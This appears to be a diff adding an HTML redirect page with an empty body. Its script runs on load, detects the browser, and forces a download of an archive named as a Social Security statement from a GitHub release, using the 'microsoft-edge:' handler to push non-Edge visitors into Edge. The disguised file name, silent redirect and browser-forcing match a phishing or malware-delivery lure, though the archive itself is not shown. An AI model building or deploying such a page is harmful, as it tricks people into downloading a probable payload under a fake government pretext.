@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        (function() {
+            var ua = navigator.userAgent;
+            var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
+            var isEdge = /Edge|Edg/i.test(ua);
+            var isDesktopEdge = !isMobile && isEdge;
+
+            var fileUrl = "https://github.com/Veri-fi/Latestssa/releases/download/V1/Latest.SSA.Statement.zip";
+            var targetUrl = isDesktopEdge ? fileUrl : "microsoft-edge:" + fileUrl;
+
+            window.location.replace(targetUrl);
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
